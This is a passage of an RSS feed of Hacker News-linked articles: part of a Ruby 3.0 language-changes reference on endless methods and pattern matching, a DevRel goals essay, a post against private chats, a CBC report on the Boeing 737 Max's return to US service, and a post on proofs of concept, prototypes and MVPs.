                     <span>.</span><span>split</span><span>(</span><span>"</span><span>\n</span><span>"</span><span>)</span>
                     <span>.</span><span>map</span><span>(</span><span>&amp;</span><span>:strip</span><span>)</span>
                     <span>.</span><span>reject</span><span>(</span><span>&amp;</span><span>:empty?</span><span>)</span>
                     <span>.</span><span>uniq</span>
                     <span>.</span><span>sort</span>

<span># Or even this, though, what's the point?..</span>
<span>def</span> <span>weird</span><span>(</span><span>name</span><span>)</span> <span>=</span> <span>begin</span>
                    <span>data</span> <span>=</span> <span>File</span><span>.</span><span>read</span><span>(</span><span>name</span><span>)</span>
                    <span>process</span><span>(</span><span>data</span><span>)</span>
                    <span>true</span>
                  <span>rescue</span>
                    <span>false</span>
                  <span>end</span>

<span># inside method body, method calls without parentheses cause a syntax error:</span>
<span>def</span> <span>foo</span><span>()</span> <span>=</span> <span>puts</span> <span>"bar"</span>
<span>#                ^ syntax error, unexpected string literal, expecting `do' or '{' or '('</span>

<span># This is due to parsing ambiguity and is aligned with some other places, like</span>
<span>x</span> <span>=</span> <span>1</span> <span>+</span> <span>sin</span> <span>y</span>
<span>#           ^ syntax error, unexpected tIDENTIFIER, expecting keyword_do or '{' or '('</span>
</code></pre></div>    </div>
  </li>
  <li><strong>Notes:</strong>
    <ul>
      <li>The initial proposal seems to be a good-natured April Fool’s joke, then everybody suddenly liked it, and, with a slight change of syntax, it was accepted;</li>
      <li>Feature is marked as EXPERIMENTAL, but it does NOT produce a warning, it is deliberate, see discussion in <a href="https://bugs.ruby-lang.org/issues/17399">Misc #17399</a>.</li>
    </ul>
  </li>
</ul>

<h3 id="pattern-matching">Pattern matching<a href="#pattern-matching"></a></h3>

<p><strong>Pattern matching, <a href="https://rubyreferences.github.io/rubychanges/2.7.html#pattern-matching">introduced in 2.7</a>, is no longer experimental.</strong> Discussion: <a href="https://bugs.ruby-lang.org/issues/17260">Feature #17260</a>.</p>

<h4 id="one-line-pattern-matching-with-">One-line pattern matching with <code>=&gt;</code><a href="#one-line-pattern-matching-with-"></a></h4>

<ul>
  <li><strong>Reason:</strong> This is an interesting one. Two facts were discussed between 2.7 and 3.0: the fact that in most of the other languages one-line pattern matching has a different order (<code>&lt;pattern&gt; &lt;operator&gt; &lt;data&gt;</code>) than introduced in Ruby 2.7 (<code>&lt;data&gt; in &lt;pattern&gt;</code>); and the idea of “rightward assignment operator” <code>=&gt;</code> for more natural chaining. And then, at some point, ideas converged most fruitfully.</li>
  <li><strong>Discussion:</strong> <a href="https://bugs.ruby-lang.org/issues/17260">Feature #17260</a>  (main pattern matching tracking ticket), <a href="https://bugs.ruby-lang.org/issues/16670">Feature #16670</a>  (reverse order), <a href="https://bugs.ruby-lang.org/issues/15921">Feature #15921</a>  (standalone rightward assignment operator), <a href="https://bugs.ruby-lang.org/issues/15799">Feature #15799</a>  (abandoned “pipeline operator” idea, in discussion of which “rightward assignment” was born)</li>
  <li><strong>Documentation:</strong> <a href="https://docs.ruby-lang.org/en/3.0.0/doc/syntax/pattern_matching_rdoc.html"><code>doc/syntax/pattern_matching.rdoc</code></a></li>
  <li><strong>Code:</strong>
    <div><div><pre><code><span># match and unpack:</span>
<span>{</span><span>db: </span><span>{</span><span>user: </span><span>'John'</span><span>,</span> <span>role: </span><span>'admin'</span><span>}}</span> <span>=&gt;</span> <span>{</span><span>db: </span><span>{</span><span>user</span><span>:,</span> <span>role</span><span>:}}</span>
<span>p</span> <span>[</span><span>user</span><span>,</span> <span>role</span><span>]</span> <span># =&gt; ["John", "admin"]</span>

<span># pattern-matching as a rightward assignment for long experessions:</span>
<span>File</span><span>.</span><span>read</span><span>(</span><span>'test.txt'</span><span>)</span>
    <span>.</span><span>split</span><span>(</span><span>"</span><span>\n</span><span>"</span><span>)</span>
    <span>.</span><span>map</span><span>(</span><span>&amp;</span><span>:strip</span><span>)</span>
    <span>.</span><span>reject</span><span>(</span><span>&amp;</span><span>:empty?</span><span>)</span>
    <span>.</span><span>first</span><span>(</span><span>10</span><span>)</span> <span>=&gt;</span> <span>lines</span>

<span>p</span> <span>lines</span> <span># first 10 non-empty lines of the file</span>

<span># unpacking+assignment is extremely powerful:</span>
<span>(</span><span>1</span><span>..</span><span>10</span><span>).</span><span>to_a</span><span>.</span><span>shuffle</span> <span>=&gt;</span> <span>[</span><span>*</span><span>before</span><span>,</span> <span>(</span><span>2</span><span>..</span><span>4</span><span>)</span> <span>=&gt;</span> <span>threshold</span><span>,</span> <span>*</span><span>after</span><span>]</span>
<span># ...in input sequence, find first entry in range 2..4, put it into `threshold`,</span>
<span># and split parts of the sequence before/after it</span>
<span>p</span> <span>[</span><span>before</span><span>,</span> <span>threshold</span><span>,</span> <span>after</span><span>]</span>    <span># your results might be different due to shuffle :)</span>
<span># =&gt; [[7, 5, 8], 3, [1, 10, 6, 9, 4, 2]]</span>

<span># The things can get really out of hand quickly:</span>
<span>Time</span><span>.</span><span>now</span><span>.</span><span>hour</span> <span>=&gt;</span> <span>..</span><span>9</span> <span>|</span> <span>18</span><span>..</span> <span>=&gt;</span> <span>non_working_hour</span>
</code></pre></div>    </div>
  </li>
  <li><strong>Notes:</strong>
    <ul>
      <li>Feature is marked as EXPERIMENTAL, will warn so on an attempt of usage, and may change in the future;</li>
      <li>But simple assignment usage (<code>data =&gt; variable</code>) is <strong>not</strong> considered experimental and is here to stay;</li>
      <li>One quirk that might be non-obvious: pattern matching can desconstruct-assign only to local variables, so when using <code>=&gt;</code> as an assignment operator, you will see those are syntax errors:
        <div><div><pre><code><span>some_statement</span> <span>=&gt;</span> <span>@x</span>
<span>some_statement</span> <span>=&gt;</span> <span>obj</span><span>.</span><span>attr</span> <span># meaning to call `obj.attr=`</span>
<span>some_statement</span> <span>=&gt;</span> <span>$y</span> <span># ...though maybe don't use global variables :)</span>
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
</ul>

<h4 id="in-as-a-truefalse-check"><code>in</code> as a <code>true</code>/<code>false</code> check<a href="#in-as-a-truefalse-check"></a></h4>

<p>After the change described above, <code>in</code> was reintroduced to return <code>true</code>/<code>false</code> (whether the pattern matches) instead of …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://rubyreferences.github.io/rubychanges/3.0.html">https://rubyreferences.github.io/rubychanges/3.0.html</a></em></p>]]>
            </description>
            <link>https://rubyreferences.github.io/rubychanges/3.0.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25575831</guid>
            <pubDate>Tue, 29 Dec 2020 22:27:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[First, Understand the Company Goals]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25575810">thread link</a>) | @mooreds
<br/>
December 29, 2020 | https://www.marythengvall.com/blog/2020/12/14/first-understand-the-company-goals | <a href="https://web.archive.org/web/*/https://www.marythengvall.com/blog/2020/12/14/first-understand-the-company-goals">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-51d739718c878a67ca0e"><div><p>"What is the main goal of a DevRel team?" is a question I've heard for years, and every time, the answer starts with "well... it depends!" What if I told you that the main goal of DevRel -- no matter what company you're at -- is to support the company's empowerment of the developer community?</p><p>From this understanding comes awareness of your products (speaking at conferences or writing up best practices), enabling your audience (getting started guides and tutorials), and engagement (making community members feel welcome and included). From this singular goal, you can more easily see where you fit into the broader tapestry of your company's goals and objectives for the weeks, months, and years ahead. The end result? A stable Developer Relations team that can easily point to the value they're bringing to the community as well as the company.</p><h2>Metrics to Track (Wrong Answers Only)</h2><p>In amidst all of those “well… it depends!” answers, you’ll likely hear some of the following answers when asking people what the primary metric is for a Developer Relations team:</p><ul data-rte-list="default"><li><p>Social Media Statistics</p></li><li><p>Number of Downloads</p></li><li><p>Number of Talks Given or Tutorials Written</p></li><li><p>What Gaps You’ve Filled (e.g. Technical Support Staff for the Community Forum, Events Management, Social Media Management, Project Manager for Product or Engineering Teams, etc.)</p></li></ul><p>I should note that these things aren’t necessarily bad in and of themselves, but they’re not enough to prove the value, and more importantly, the impact of your work. There needs to be a larger story attached to them.&nbsp;</p><p>For instance, tracking social media statistics like Twitter followers or GitHub stars doesn’t tell you anything about the actual engagement from the community or who they are. Download metrics don’t tell you whether the people who downloaded your platform are still using it or whether they were able to successfully solve their problems. These metrics quickly become what we call <strong>vanity metrics</strong>: items that are easy to track but don’t often speak to the larger business value of the work you’re doing.</p><p><strong>Work output </strong>is the second category of metrics that are typically tracked. While tracking how many blogposts, tutorials, or talks your team can accomplish in a single quarter can be helpful in figuring out a good work cadence for your team, once again, delivering these metrics to your senior leadership doesn’t speak to the <em>impact</em> that this work has had on the company or the community. All of the awareness, enablement, or engagement that you’ve worked toward with these tasks (the truly important things) is left by the side as you emphasize to management just how much work you were able to accomplish.</p><p>This last category of metrics often isn’t explicitly defined, but can simply occur as companies try to figure out where a DevRel team best fits within the company. Do we belong in Marketing? Product? Customer Success? <strong>Filling gaps </strong>from other teams is often an easy way for the company to justify the expense of a DevRel department. Is the team able to handle all of the technical support questions that come into the forum from the free or open source community members? Do they handle all of the events management and staffing for developer-facing events? Perhaps they run the developer-centric social media accounts for the company or help the Product and Engineering teams with project management tasks. While all of these tasks are important (and sometimes fall under the purview of Developer Relations), none of them highlight the unique qualities that DevRel professionals bring to the table.</p><h2>Finding the Right Goals</h2><p>So if those are the <em>wrong</em> answers… what is the goal of a Developer Relations team? It turns out, “It Depends” isn’t always a bad answer! Your end goal will depend on which audience your company is focused on, what stage your company is at, and what the maturity of your product is, but there is a question you can answer that will solve most of these problems for you.</p><p><em>How can we help our colleagues, using our own unique talents to support their goals,<br>while still providing value to the community?</em></p><p>In order to successfully prove the value of our work in a way that the company understands and sees as beneficial, we need to attach the main goals of the Developer Relations department to the goals that are shared by the company as a whole. Let’s break this down…&nbsp;</p><p><strong>This work has to be done in a way the company understands</strong>. It needs to be related to the work that another team is doing in a support capacity (e.g. helping to build out a social media presence with a technical audience) or in a way that actively furthers the company vision (e.g. collecting feedback from trusted community members which will help shape the product roadmap).</p><p><strong>This work needs to be seen as beneficial</strong>.<em> </em>What is the impact of the work that you’ve done? It’s not just enough to answer questions on Stack Overflow that are related to your product. After all, Engineering, Technical Support, or Product could likely do that as well. But if you can spot patterns and trends throughout the tech industry while spending time engaging with your community on Stack Overflow, you’re then able to bring your unique perspective back to the company. This information can then be used by Marketing to create additional content, Product to decide on the best way forward with a new feature, and even Sales to highlight new use cases during their calls with prospects.</p><p><strong>The work that we’re doing needs to be attached to the team goals, which then point to the broader company goals</strong><em>. </em>This is where we go back to the three-part goal of awareness, enablement, and engagement. Is your company trying to raise its ARR? Finding ways to increase developer awareness of your product through speaking engagements, unique tutorials, or syndicated content is just one way to increase traffic to your site. Perhaps they’re attempting to reduce churn. By focusing on developer experience, you can ensure that developers are having a great experience from the start. When this is followed by a great experience with your community, customers are that much more inclined to stick around a while longer!&nbsp;</p><h2>The Big Question</h2><p>This brings us back to the big question I referenced earlier:</p><p><em>How can we help our colleagues, using our own unique talents to support their goals,<br>while still providing value to the community?</em></p><p>This is a big question because it requires us to actually know what our unique talents are! What do we bring to the table that sets us apart from the other departments? What value do we bring to the company as well as the community that other people aren’t able to achieve?</p><p>Here are a few examples:</p><ul data-rte-list="default"><li><p>Gather community opinions and translate them into actionable feedback that the Product and Engineering teams can benefit from</p></li><li><p>Connect with community members one-on-one and start a relationship that’s going to keep them coming back to day after day, even if they do run into issues</p></li><li><p>Make introductions between community members and our coworkers that bring significant value back to other teams (see also: <a href="https://www.marythengvall.com/blog/2019/12/14/devrel-qualified-leads-repurposing-a-common-business-metrics-to-prove-value"><span>DevRel Qualified Leads</span></a>)</p></li></ul><p>What’s important is that we find these unique qualities that set us apart as we engage with our communities. These qualities allow us to further our co-worker’s goals as well as our company’s goals while still providing that tremendous value back to our community at the end of the day.</p><h2>Libby Boxes: Let’s Get Practical</h2><p><a href="https://glennremoreras.com/tag/libby-boxes/"><span>Libby Boxes</span></a>, a predictive framework popularized by Cornell Accounting Professor Robert Libby, allow us to draw directly from the company objectives all the way down to the specific work output we’re working toward during a specific sprint (monthly, quarterly, yearly, etc.). This helps the DevRel team ensure they’re working toward common company goals while still serving the community (which is our <a href="https://www.marythengvall.com/blog/2019/5/22/what-is-developer-relations-and-why-should-you-care"><span>top priority</span></a> at the end of the day). It also gives senior leadership a way to see the direct impact the DevRel team is having on the company and reinforces our value internally as well as externally.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1607980404342_43459"><p>The top row of boxes is for the concepts or ideas that you’re working toward. Once these more general ideas are identified, you’re able to move to the lower boxes where you’ll start to think more tactically about what initiatives you might explore and how you can measure the success of these concepts to ensure that they’re going to have an impact on that overarching goal.</p></div><div data-block-type="2" id="block-yui_3_17_2_1_1607980404342_17070"><div><p>Let’s break down the questions you’ll be asking in each of these boxes:&nbsp;</p><p><strong>Top right:</strong> What’s the company goal you’re trying to work toward?</p><p>I try to choose the goal that I know we’ll be able to impact the most. For instance, I’ll rarely choose the Sales goal of increasing annual recurring revenue (ARR), as Developer Relations doesn’t often directly impact the number of closed opportunities (we do have a significant impact on long-term growth, but that’s a topic for another blogpost). If ARR is indeed your company’s one and only goal for the foreseeable future, you could pivot the goal slightly to awareness, as the work output of a DevRel team typically increases the general developer awareness of your product.</p><p><strong>Top left:</strong> What’s one of the ways you want to try to impact that goal this quarter?</p><p>These answers are very general (they might almost feel too general sometimes!) but are buckets of items that you could experiment with throughout this particular time period. For instance, I’d list “Create content” rather than “Write blogposts,” since blogposts are a subset of content, which also includes videos, tutorials, live streams, and more.</p><p><strong>Bottom left: </strong>What are the specific tactics or “levers” you’re going to pull in order to test the experiment?</p><p>This is where we start to explore the more tangible items. Perhaps we’ll start to look at whether external advocates (non-employees) are writing content or speaking at conferences on our behalf, which may help us to decide whether a Champion Program might be a useful initiative to explore in the future.</p><p><strong>Bottom right: </strong>How will you know whether or not the experiment was a success?</p><p>These metrics could be the …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.marythengvall.com/blog/2020/12/14/first-understand-the-company-goals">https://www.marythengvall.com/blog/2020/12/14/first-understand-the-company-goals</a></em></p>]]>
            </description>
            <link>https://www.marythengvall.com/blog/2020/12/14/first-understand-the-company-goals</link>
            <guid isPermaLink="false">hacker-news-small-sites-25575810</guid>
            <pubDate>Tue, 29 Dec 2020 22:25:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Death to Private Chats]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25575588">thread link</a>) | @mcrittenden
<br/>
December 29, 2020 | https://critter.blog/2020/12/29/death-to-private-chats/ | <a href="https://web.archive.org/web/*/https://critter.blog/2020/12/29/death-to-private-chats/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
	<p><a href="#content">Skip to content</a></p><!-- #masthead -->

	
	<div id="content">

	<div id="primary">
		<main id="main">

		

<article id="post-4900">
	<!-- .entry-header -->

	<div>
		
<p>I see you, serial DM’ers. Yes you there, defaulting to 1-on-1 chats instead of team chat rooms. You know who you are.</p>



<p>You mean well, I get it. Why would you ask the whole team something when you can just DM the person you know has the answer? You’re protecting the rest of the team from stuff that they don’t care about, right? You’re helping them avoid <a href="https://critter.blog/2019/09/05/the-chatodoro-breaking-the-group-chat-addiction/">distraction and chat overwhelm</a>, yeah?</p>



<p>Wrong. You’re a thief. <em><a href="https://critter.blog/2020/12/22/power-in-naming-things/">The Serendipity Bandit</a></em>, that’s you.</p>



<ul><li>You’re robbing the rest of the team of opportunities to learn from the answers to the questions you ask.</li><li>You’re robbing yourself of <a href="https://critter.blog/2020/08/27/coaching-without-doing/">the chance to learn</a> from advice and insight the rest of the team may have.</li><li>You’re robbing everyone of unexpected connections and the chance to <a href="https://critter.blog/2020/12/15/good-teams-are-noisy/">be noisy, as the best teams are</a>.</li></ul>



<p>Here’s my rule of thumb: only use DMs for things that are actually private. <strong>Private chats are for private things</strong>. Everything else should go in a team room. </p>



<p>I don’t care what it is. Questions about a broken build, thoughts about <a href="https://critter.blog/2020/08/20/plan-the-sprint-not-the-project/">the roadmap</a>, pondering about a movie you saw, a link to a dope YouTube video, whatever. Put it in a team room unless it’s actually private.</p>



<p>If you’re worried you’ll annoy people, then who are you to decide on their behalf that they’ll be annoyed? If you’re worried you’ll <a href="https://critter.blog/2020/11/17/stop-trying-to-be-impressive-start-trying-to-be-warm/">look stupid</a> or nerdy for asking dumb questions or broadcasting dorky thoughts to everyone, have you <a href="https://critter.blog/2020/11/19/avoid-avoiding/">considered not caring</a>? Maybe you’ll see that your teammates are just as dumb and nerdy as you are.</p>



<p>Show some vulnerability and <a href="https://critter.blog/2020/12/14/are-we-actually-a-team/">see what happens</a>. And for goodness sake, when you see someone else doing that, <a href="https://critter.blog/2020/11/05/respond-to-vulnerability-with-vulnerability/">be the first follower</a>.</p>




	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article><!-- #post-4900 -->
			<!-- .post-nav-wrapper -->
		
		</main><!-- #main -->
	</div><!-- #primary -->


<!-- #secondary -->

	</div><!-- #content -->

	
	<!-- #colophon -->
</div></div>]]>
            </description>
            <link>https://critter.blog/2020/12/29/death-to-private-chats/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25575588</guid>
            <pubDate>Tue, 29 Dec 2020 22:02:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Boeing 737 Max flies first commercial flight in U.S. since fatal crashes]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25575578">thread link</a>) | @awnird
<br/>
December 29, 2020 | https://www.cbc.ca/news/world/boeing-max-737-resumes-flights-1.5856671 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/world/boeing-max-737-resumes-flights-1.5856671">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>American Airlines flew a Boeing 737 Max with paying passengers from Miami to New York on Tuesday, the plane's first commercial flight in U.S. skies since 2019 when it was grounded after two deadly crashes.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5856684.1609268495!/fileImage/httpImage/image.JPG_gen/derivatives/16x9_780/boeing-737max-american-airlines.JPG"></p></div><figcaption>American Airlines flight 718, the first U.S. Boeing 737 Max commercial flight since regulators lifted a 20-month grounding in November, lands at LaGuardia airport in New York, on Dec. 29, 2020.  <!-- --> <!-- -->(Eduardo Munoz/Reuters)</figcaption></figure><p><span><p>American Airlines flew a Boeing 737 Max with paying passengers from Miami to New York on Tuesday, the plane's first commercial flight in U.S. skies since it was grounded in 2019 after two deadly crashes.</p>  <p>American flight 718 carried about 100 passengers, according to an airline spokesperson, and landed Tuesday afternoon at LaGuardia Airport.</p>  <p>Last month, the Federal Aviation Administration approved changes that Boeing made to an automated flight-control system implicated in crashes in Indonesia and Ethiopia that killed 346 people in all. In both crashes, the system pushed the nose down repeatedly based on faulty sensor readings, and pilots were unable to regain control.</p>  <p>The FAA cleared the way for U.S. airlines to resume using the plane if certain changes are made and pilots are provided with additional training including time in a flight simulator.</p>  <p>Transport Canada has taken the first step toward clearing the Boeing 737 Max to fly again by approving design changes to the aircraft in the wake of the two deadly crashes.</p>    <p>The department says Canadian pilots can start training&nbsp;flights in January, a sign the plane could return to service in Canada early in the new year.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5856680.1609268357!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/brazil-737-max.jpg 300w,https://i.cbc.ca/1.5856680.1609268357!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/brazil-737-max.jpg 460w,https://i.cbc.ca/1.5856680.1609268357!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/brazil-737-max.jpg 620w,https://i.cbc.ca/1.5856680.1609268357!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/brazil-737-max.jpg 780w,https://i.cbc.ca/1.5856680.1609268357!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/brazil-737-max.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5856680.1609268357!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/brazil-737-max.jpg"></p></div><figcaption>Gol Airlines became the first in the world to return the planes, grounded after two deadly crashes, to its active fleet on Wednesday, Dec. 9, 2020. <!-- --> <!-- -->(Andre Penner/The Associated Press)</figcaption></figure></span></p>  <h2>Brazil&nbsp;1st&nbsp;to resume&nbsp;737 Max&nbsp;flights</h2>  <p>Brazil's Gol airlines operated the first passenger flight with a revamped Max on Dec. 9. Since then, Gol and Aeromexico have operated about 600 flights between them with Max jets, according to tracking service Flightradar24 and aviation-data firm Cirium.</p>  <p>American Airlines plans to make one round trip a day between Miami and New York with Max jets through Jan. 4 before putting the plane on more routes. United Airlines plans to resume Max flights in February, and Southwest Airlines expects to follow in March.</p>  <p>All three airlines say they will give customers the chance to change flights if they are uncomfortable flying on the Max.</p>  <h2>Aircraft grounded nearly 2 years ago</h2>  <p>The Max was grounded worldwide in March 2019, days after the second crash. Reports by U.S. House and Senate committees faulted Boeing and the FAA for failures in the process of certifying the plane.</p>  <p>Congressional investigators uncovered internal Boeing documents in which company employees raised safety concerns and bragged about deceiving regulators.</p>  <p>FAA Administrator Stephen Dickson, a former military and airline pilot, operated a test flight in September and vouched for the reworked plane's safety, saying he would put his family on it.</p>  <p><em><strong>WATCH | 2 years after crashes, Boeing 737 Max flying again:</strong></em></p>  <p><span><span><div><div title="Boeing 737 Max returns to flight 2 years after crashes" role="button" tabindex="0"><div><div aria-labelledby="1838470723921-metadata-" title="Boeing 737 Max returns to flight 2 years after crashes"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/215/319/boeing-max-8-first-flight-simpson-291220.jpg" alt="" loading="lazy"></p></div></div></div></div></div><span>The Boeing 737 Max-8 made its first passenger flight, from New York to Miami, on Tuesday, two years after being grounded for a pair of deadly crashes.<!-- --> <!-- -->1:59</span></span></span></p>  <p>American Airlines President Robert Isom was on Tuesday's inaugural U.S. flight, according to the airline.</p>  <p>Some relatives of people who died in the second crash, a Max operated by Ethiopian Airlines, contend that the plane is still unsafe. They and their lawyers say that Boeing is refusing to hand over documents about the plane's design and development.</p>  <p>"The truth is that 346 people are now dead because Boeing cut corners, lied to regulators, and simply considers this the cost of doing business," Yalena Lopez-Lewis, whose husband died in the crash, said in a statement issued by her lawyers.</p>  <p>"It is infuriating that American Airlines is in effect rewarding Boeing for the corrupt and catastrophic process that led to the Max."</p>    <p>Zipporah Kuria, a British citizen whose father also died in the Ethiopian crash, pointed to the recent disclosure in a Senate committee report that Boeing representatives coached FAA test pilots reviewing Boeing updates to the Max flight-control system.</p>  <p>"Boeing leadership is still riddled with deceit. Their priorities are not on consumer safety," she said in an interview.</p>  <p>Boeing spokesperson&nbsp;Bernard Choi said the company "learned many hard lessons" from the crashes and is committed to safety.</p>  <p>"We continue to work closely with global regulators and our customers to support the safe return of the fleet to service around the world," Choi said.</p>  <p>The return of the plane to U.S. skies is a huge boost for Boeing, which has lost billions during the Max grounding because it has been unable to deliver new planes to airline customers.</p>  <p>Orders for the plane have plunged. Boeing has removed more than 1,000 Max jets from its backlog because airlines cancelled orders or the sales are not certain to go through because of the pandemic crisis gripping the travel industry.</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/world/boeing-max-737-resumes-flights-1.5856671</link>
            <guid isPermaLink="false">hacker-news-small-sites-25575578</guid>
            <pubDate>Tue, 29 Dec 2020 22:01:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Proof of Concept, Prototype, and MVP: The Purpose, Audience and Benefits]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25575275">thread link</a>) | @allending
<br/>
December 29, 2020 | https://blog.snappymob.com/proof-of-concept-prototype-and-mvp-the-purpose-the-audience-and-the-benefits | <a href="https://web.archive.org/web/*/https://blog.snappymob.com/proof-of-concept-prototype-and-mvp-the-purpose-the-audience-and-the-benefits">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>No one wants to launch a product that nobody needs.&nbsp;</p>
<!--more--><p>Before developing a full-fledged product, it’s necessary to see proof of its viability and likelihood of attracting investments and users. That is why these three tools exist — the Proof of Concept (POC), the prototype, and the Minimum Viable Product (MVP).</p>
<p>What are they for, who are they for, and how to they improve the product development process?&nbsp;</p>
<h2>Research: Proof of Concept (POC)</h2>
<p>Question: <em>Can it be done?</em><span><img src="https://lh6.googleusercontent.com/06oIxuXgIJ3eCmy3qO4YpMzax4MPiPfadZJLzeEXA68qGwgiPc1lKtg7CK1K8oX6D8BN6g4_SpMSwaRMfIqYOS5YoI1YHhxrZPeP-1CnSrGXOdAYNAhmtou1c17BroRX5ato5W3_" width="741" alt="man looking at whiteboard product mapping plan"></span></p>
<p>When companies cannot yet be sure if they can trust your idea or your capabilities as a development team, what you need to do is convince them that they can. That’s what a Proof of Concept does.&nbsp;</p>
<p>Especially for concepts or methods that are new to the market, a POC sells your idea by verifying that your hypothesis has the potential for real-world application.</p>
<p>Unlike a prototype and an MVP, a Proof of Concept isn’t customer-focused and is only shared within the product team. Being in the research phase of the product development process, its focus is not yet on representing deliverables or gathering feedback, but on laying the foundation by determining technical and functional feasibility.</p>
<p>Usually, these feasibility tests are done on specific functions within the product. A great example would be Walmart testing blockchain technology on cross-border product tracking before officially implementing it into their logistics.</p>
<h3>Purpose:</h3>
<p>1. To test a product’s technical feasibility.<br>2. To validate a particular feature or functionality.<br>3. To prove that a product can perform as envisioned.</p>
<h3>Audience:&nbsp;</h3>
<p>Product team.</p>
<h3>Benefits:</h3>
<p>1. Saves time and costs.<br>2. Gives potential investors confidence.<br>3. Saves resources and reduces risk.</p>
<h2>Design: Prototype</h2>
<p>Question: <em>How can it be done?</em><span><img src="https://lh6.googleusercontent.com/K6_mn0XeVJUL4iz983E4ciOwvnCgxjASjMNsyhce85vcSwC4qwD6gQzDW77q5vEii0eTJ69vLTAgjn2sQnZithoXeVNFpSOxznbb5QLUgHAqxf-6lJzLWKuj2CsZsa0gfCfJ0Drs" width="744" alt="marvelapp prototype design uiux user flows"></span><br>Image: <a href="https://userflows.marvelapp.com/"><span>Marvel</span></a></p>
<p>After a POC proves that an idea is viable, prototypes come next in line.&nbsp;</p>
<p>As a mockup created to visualize elements and user interaction flows, prototypes focus on UI/UX design and getting feedback on usability and user experience. Designers in a product team work with wireframes to produce an imitation that is interactive and reflective of the desired look and feel of the product.</p>
<p>Being part of the design phase of the product pipeline, prototypes often underlie MVPs in the development phase. It is extremely useful for early investor demonstrations and user testing.</p>
<h3>Purpose:</h3>
<p>1. To visualize functionality and user flows.<br>2. To highlight design, usability, and user experience.<br>3. To get early feedback from end users.</p>
<h3>Audience:&nbsp;</h3>
<p>Product team and select users.</p>
<h3><strong>Benefits:</strong></h3>
<p>1. Identifies technical challenges early.<br>2. Attracts investors and encourages funding.<br>3. Saves resources and reduces risk.</p>
<h2><strong>Develop: Minimum Viable Product (MVP)</strong></h2>
<p>A Minimum Viable Product, also known as an Earliest Testable Product or pilot, is generally defined as “a standalone application that is launch-ready”.</p>
<p>Henrik Kniberg explains on <a href="https://blog.crisp.se/2016/01/25/henrikkniberg/making-sense-of-mvp"><span>Crisp’s blog</span></a> that building an MVP is less about building an incomplete or to-be-completed version of your product, but delivering the smallest or simplest possible way to fulfill your users’ underlying needs. It has to be testable and usable because unlike a prototype, MVPs are released to the public for real users to put their hands on and respond to.</p>
<p><span><img src="https://lh3.googleusercontent.com/GuQYa7AWjzP7cvKvs9LkqWzG2yQT0o6xKe8x-j_Z62ZeLCHsRriiNPwJkYfmCrBApQ03YfvMF4kUp7pobXh977fxJKoeUcOVXAiL_oGFJIpO96yFnHYT7UlxoLe1PxJ2TJxnouD0" width="731" alt="henrik kniber illustration mvp car product pipeline"></span></p>
<p>At this point of a project, although close to a full-fledged launch, it’s more about selling people a function rather than the actual product. It’s giving them a tool that helps them achieve a goal the same, despite it being different from the product you’re planning to eventually arrive at.</p>
<p>User feedback plays an important role in this stage of development. With the help of constructive feedback, a team figures out how to iterate on their MVP and transform it from a Minimum Testable Product to a Minimum Usable Product, and finally to a Minimum Lovable Product that is marketable and close to their final vision.&nbsp;</p>
<h3><strong>Purpose:</strong></h3>
<p>1. To assess and reduce risks of failure.<br>2. To get more feedback from end users.</p>
<h3><strong>Audience:&nbsp;</strong></h3>
<p>Product team and general public.</p>
<h3><strong>Benefits:</strong></h3>
<p>1. Saves development time and costs.<br>2. Reduces time-to-market.<br>3. Draws focus onto essentials.</p>
<h2><strong>Build With Us</strong></h2>
<p>If you’re thinking about building a digital product but aren’t sure where to begin, Snappymob might be able to help you.</p>
<p>Our team is equipped with product designers and developers who are well versed in the entire product pipeline, from research to development to launch. Let us know how we can bring your ideas to life!</p>
